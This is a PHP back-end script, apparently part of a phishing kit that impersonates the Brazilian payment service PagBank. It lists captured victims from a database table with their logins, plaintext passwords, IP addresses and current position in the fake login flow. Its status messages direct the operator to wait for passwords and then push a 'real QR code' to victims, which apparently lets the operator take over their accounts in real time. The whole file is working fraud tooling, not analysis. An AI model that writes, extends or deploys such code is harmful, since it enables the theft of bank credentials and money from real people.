<?php
header('Content-Type: application/json; charset=utf-8');

$DATABASE_URL = getenv("DATABASE_URL");
if (!$DATABASE_URL) {
    // Adapte para seu ambiente de teste local se necessário
    $DATABASE_URL = "host=SEU_HOST port=5432 dbname=SEU_DB user=SEU_USER password=SEU_PASS";
}

$db = pg_connect($DATABASE_URL);

if (!$db) {
    echo json_encode(["erro" => "Erro ao conectar ao banco de dados."]);
    exit;
}

$result = pg_query($db, "SELECT * FROM clientes_pagbank ORDER BY created_at DESC");

if (!$result) {
    echo json_encode(["erro" => "Erro na consulta SQL."]);
    exit;
}

$dados = [];
$timezone_sp = new DateTimeZone('America/Sao_Paulo');

while ($row = pg_fetch_assoc($result)) {

    // --- Lógica de status (sem alterações) ---
    $status_manual = $row['status'];
    $pagina_atual = $row['current_page'];
    $status_final = '';
    // ... (toda a sua lógica de switch para o status_final permanece a mesma) ...
    if ($status_manual === 'aprovado') {
        $status_final = 'Usuário Na tela do QR Code, faça o envio do QR real.';
    } else if ($status_manual === 'negado') {
        $status_final = 'Usuário negado pelo Admin.';
    } else {
        switch ($pagina_atual) {
            case 'login-desktop.php': case 'login.php':
                $status_final = 'Usuário na tela de login, aguarde pela senha.'; break;
            case 'senha-desktop.php': case 'senha.php':
                $status_final = 'Usuário na tela de senha, aguardando digitação.'; break;
            case 'aguarde.php':
                $status_final = 'Aguardando liberação para a tela do QR Code.'; break;
            case 'validacao.php': case 'validacao-mobile.php':
                $status_final = 'Na tela do QR Code, faça o envio do QR real.'; break;
            default:
                $status_final = 'Aguardando ação do usuário...'; break;
        }
    }

    // --- Lógica de Conversão de Data ---
    $created_at_formatado = '';
    if (!empty($row['created_at'])) {
        $date_utc = new DateTime($row['created_at'], new DateTimeZone('UTC'));
        $date_utc->setTimezone($timezone_sp);
        $created_at_formatado = $date_utc->format('Y-m-d H:i:s');
    }

    $dados[] = [
        "cliente_id"     => $row['cliente_id'] ?? '',
        "identificador"  => $row['identificador'] ?? '',
        "senha"          => $row['senha'] ?? '',
        "ip"             => $row['ip'] ?? '',
        "status"         => $status_final,
        "created_at"     => $created_at_formatado, // Data de criação convertida para SP (para exibição)

        // --- CORREÇÃO PRINCIPAL ---
        // Enviamos 'last_active_at' no seu formato original UTC, que é o correto para o cálculo
        "last_active_at" => $row['last_active_at'] ?? null,

        "current_page"   => $row['current_page'] ?? 'Desconhecida',
        "device_type"    => $row['device_type'] ?? 'Desconhecido'
    ];
}

echo json_encode($dados);
?>